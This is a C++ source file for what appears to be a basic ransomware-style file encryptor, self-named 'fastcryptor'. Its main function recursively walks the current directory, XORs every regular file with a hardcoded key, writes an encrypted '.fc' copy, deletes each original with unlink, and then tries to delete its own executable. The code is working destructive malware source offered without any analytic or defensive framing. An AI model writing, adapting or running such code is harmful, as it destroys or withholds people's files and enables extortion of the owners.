#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <dirent.h>
#include <cstring>
#include <unistd.h>
#include <sys/stat.h>

const std::string key = "fastcryptor_for_the_win_haha";

void encryptFile(const std::string& fileName)
{
    std::ifstream inputFile(fileName, std::ios::binary);
    if (!inputFile.is_open()) {
        std::cerr << "Error opening file: " << fileName << std::endl;
        return;
    }

    if (fileName.find("FC2") != std::string::npos) {
        return;
    }

    if (fileName.length() > 3 && fileName.substr(fileName.length() - 3) == ".fc") {
        return;
    }

    std::vector<char> data((std::istreambuf_iterator<char>(inputFile)), 
                           (std::istreambuf_iterator<char>()));
    inputFile.close();

    int totalSize = data.size();
    int processed = 0;

    for (int i = 0; i < totalSize; i++) {
        data[i] ^= key[i % key.length()];

        processed++;
        int percentage = (processed * 100) / totalSize;

        std::cout << "\rEncrypting " << fileName << " - " << percentage << "% complete";
        std::cout.flush();
    }
    std::cout << std::endl;

    std::string encryptedFileName = fileName + ".fc";
    std::ofstream outputFile(encryptedFileName, std::ios::binary);
    if (!outputFile.is_open()) {
        std::cerr << "Error opening file: " << encryptedFileName << std::endl;
        return;
    }

    outputFile.write(data.data(), data.size());
    outputFile.close();

    if (unlink(fileName.c_str()) != 0) {
        std::cerr << "Error deleting file: " << fileName << std::endl;
    }
}


void encryptDirectory(const std::string& dirName)
{
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(dirName.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            std::string fileName = dirName + "/" + ent->d_name;
            struct stat st;
            if (stat(fileName.c_str(), &st) == 0) {
                if (S_ISREG(st.st_mode)) {
                    encryptFile(fileName);
                } else if (S_ISDIR(st.st_mode) && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                    encryptDirectory(fileName);
                }
            }
        }
        closedir(dir);
    } else {
        std::cerr << "Error opening directory: " << dirName << std::endl;
    }
}

int main()
{
    encryptDirectory(".");

    if (unlink("FC2") != 0) {
        if (unlink("FC2.exe") != 0) {
            std::cerr << "Error deleting file: FC3" << std::endl;
        }
    }

    return 0;
}
